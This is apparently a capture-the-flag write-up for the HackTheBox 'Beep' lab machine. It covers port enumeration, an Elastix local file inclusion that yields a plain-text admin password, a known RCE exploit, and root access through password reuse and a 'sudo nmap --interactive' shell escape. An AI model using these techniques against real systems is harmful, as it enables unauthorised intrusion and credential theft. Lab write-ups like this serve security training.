Name and IP Address of Machine: 
> Beep: `10.10.14.7`
<!-- TOC -->

- [Synopsis](#synopsis)
- [Enumeration](#enumeration)
- [FootHold](#foothold)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)
- [Extra](#extra)

<!-- /TOC -->



## Synopsis

## Enumeration

Open Ports found:
- [ ] 22(ssh),
- [ ] 25(smtp),
- [x] **80(http)**,
- [ ] 110(pop3),
- [ ] 111(rpcbind),
- [ ] 143(imap),
- [x] **443(https)**,
- [ ] 993(ssl/imap),
- [ ] 995(ssl/pop3),
- [ ] 3306(mysql),
- [ ] 4445(?),
- [x] **10000(http)(Miniserv 1.570)**


Port 443 running elastix service which is vulnerable to local file inclusion. Got to know from 
> `searchsploit elastix` 
```bash
┌──(ircashem)㉿(10.10.14.28)──[~/HackTheBox/beep]
└─$ searchsploit elastix                                                                                                         130 ⨯
-------------------------------------------------------------------------------------
 Exploit Title                                                | Path
------------------------------------------------------------------------------------- 
Elastix - 'page' Cross-Site Scripting                         | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities       | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion              | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                             | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                            | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution        | php/webapps/18650.py
-------------------------------------------------------------------------------------
Shellcodes: No Results
```
 
> Vulnerable Version: 2.2.0

## FootHold
Exploiting lfi to extract credentials from the conf files of elastix service.
> admin:`jEhdIekWmdjE`
from `/etc/passwd` reveals a user `fanis` is there.


## Lateral Movement
Now after authenticating to the elastix service, there is another exploit for this software which was vulnerable to rce when authenticated. Since we can now authenticate to the system, exploiting it with the script `18650.py`, we got shell as user `asterisk`.


## Privilege Escalation

> `Password Reuse`: 
> 
> Using the password of asterisk which we found on the amportal.conf, we got shell as root

```bash
bash-3.2$ whoami
asterisk
bash-3.2$ su -
Password: 
[root@beep ~]#
```

Another way for getting root is that user asterisk can run few commands as sudo without password. 

```bash
bash-3.2$ sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME
    LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
    
bash-3.2$ sudo /usr/bin/nmap --interactive
nmap> !bash
root@beep #
```

## Extra
I was not able to login via ssh because the ssh uses the encryption mechanism for the key exchange was quite old and not supported by our ssh now. Have to add a flag to do so.
```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7
```


<!-- ## Thank You 
🕉️  -->



